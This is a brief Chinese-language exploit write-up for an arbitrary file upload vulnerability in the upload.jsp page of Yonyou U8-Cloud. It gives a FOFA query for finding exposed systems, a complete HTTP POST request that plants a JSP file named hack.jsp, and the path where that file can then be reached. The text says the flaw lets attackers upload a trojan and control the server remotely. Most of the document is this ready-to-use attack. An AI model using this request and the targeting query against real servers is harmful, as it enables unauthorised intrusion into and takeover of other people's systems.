
## 用友U8-Cloud upload任意文件上传漏洞
该系统upload.jsp存在任意文件上传漏洞，攻击者可通过该漏洞上传木马，远程控制服务器

## fofa
```app="用友-U8-Cloud"```

## exp
```
POST /linux/pages/upload.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 31
Content-Type: application/x-www-form-urlencoded
filename: hack.jsp
Accept-Encoding: gzip

<% out.println("The website has vulnerabilities!!");%>
```
## 漏洞复现
![](https://img-blog.csdnimg.cn/img_convert/4e222417f164a3b33772bf18041feb82.png)

![](https://img-blog.csdnimg.cn/img_convert/d68273de84c541f1cb5a0ac52b469b98.png)

## 路径
http://ip:port/linux/hack.jsp

